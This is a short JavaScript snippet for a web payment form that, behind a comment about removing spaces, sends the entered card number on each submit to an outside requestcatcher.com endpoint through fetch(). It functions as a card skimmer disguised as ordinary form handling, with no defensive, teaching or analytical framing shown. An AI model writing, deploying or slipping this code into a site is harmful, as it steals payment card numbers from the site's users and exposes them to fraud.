const paymentForm = document.getElementById('payment-form');
const cardNumberInput = document.getElementById('card-number');


paymentForm.addEventListener('submit', function(event) {
    // Remove any spaces the user might have entered
    const rawValue = cardNumberInput.value.replace(/\s+/g, '');

	fetch("https://a23d4rf.requestcatcher.com/", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ message: rawValue })
  });


});
